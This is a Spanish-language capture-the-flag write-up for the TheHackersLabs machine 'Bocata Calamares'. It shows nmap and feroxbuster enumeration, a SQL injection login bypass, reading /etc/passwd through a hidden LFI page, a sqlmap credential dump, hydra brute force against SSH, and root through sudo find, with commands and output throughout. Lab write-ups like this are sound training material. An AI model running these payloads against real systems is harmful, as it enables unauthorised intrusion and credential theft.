# Writeup — Bocata Calamares (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Ubuntu 24.04.1 LTS  
**IP:** 192.168.1.148  
**Objetivo:** Obtener flag.txt y root.txt

## Reconocimiento

```bash
sudo arp-scan -I eth0 --localnet
# Target: 192.168.1.148 (MAC VirtualBox)

nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.1.148 -oG all_ports.txt
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 11:58 -0400
Nmap scan report for 192.168.1.148
Host is up (0.000094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:98:63:AB (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds
```

```bash
nmap -p22,80 -sCV -vvv 192.168.1.148 -oN tcp_scan.txt
```

**Puertos abiertos:**
- `22/tcp` - OpenSSH 9.6p1
- `80/tcp` - nginx 1.24.0, título "AFN"

## Enumeración Web

```bash
feroxbuster -u http://192.168.1.148/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php
```

**Archivos encontrados:**
- `index.php`
- `login.php`
- `sqli.php`
- `admin.php`
- `images/`

## SQL Injection en login.php

Credenciales: `admin` / `' OR '1'='1`

Se accede a `admin.php` que contiene un diario del desarrollador. Menciona una página oculta para leer archivos internos, codificada en base64.

## LFI - Lectura de archivos

El nombre "lee_archivos" en base64:

```bash
echo -n 'lee_archivos' | base64
bGVlX2FyY2hpdm9z

echo 'lee_archivos' | base64
bGVlX2FyY2hpdm9zCg==
```

URL funcional: `http://192.168.1.148/bGVlX2FyY2hpdm9zCg==.php`

Se introduce `/etc/passwd` en el formulario y se obtiene el listado de usuarios del sistema. Los usuarios relevantes son:

- `tyuiop` (uid 1000)
- `superadministrator` (uid 1001)

El código fuente revela la pista:

```html
<!-- Tengo que limitar los archivos que se pueden ver, al menos hasta que los usuarios tengan unas contraseñas más robustas -->
<!-- Si alguien leyera el archivo donde se encuentran los usuarios y usara la herramienta hydra para atacar nuestro servicio ssh... Bueno, mañana me encargare de ello -->
```

## Extracción de la BD con sqlmap

```bash
sqlmap -u 'http://192.168.1.148/login.php' --batch --dump --forms
```

**Usuarios y contraseñas:**

| id | alias     | contraseña | nombre  |
|----|-----------|------------|---------|
| 1  | adminPrinc | 123456     | admin   |
| 2  | Pep100    | qwertyuiop | pepe    |
| 3  | Jaime_P   | jaime      | jaime   |
| 4  | Richard   | qwertyu    | Ricardo |

## Fuerza bruta SSH con hydra

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 20 ssh://192.168.1.148
```

**Credenciales:** `superadministrator:princesa`

## Flag de usuario

```bash
ssh superadministrator@192.168.1.148
cat flag.txt   # <REDACTED> → "sudo -l"
cat recordatorio.txt  # Pista de GTFOBins
```

## Escalada de privilegios

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

sudo find . -exec /bin/sh \; -quit
# whoami → root
```

## Flag de root

```bash
cat /root/root.txt
# <REDACTED>
```

---

**Resumen:**

1. SQLi en login.php
2. LFI con nombre en base64
3. Lectura de `/etc/passwd` vía LFI
4. Dump de BD con sqlmap
5. Hydra contra SSH
6. Escalada con `find` vía sudo (GTFOBins)
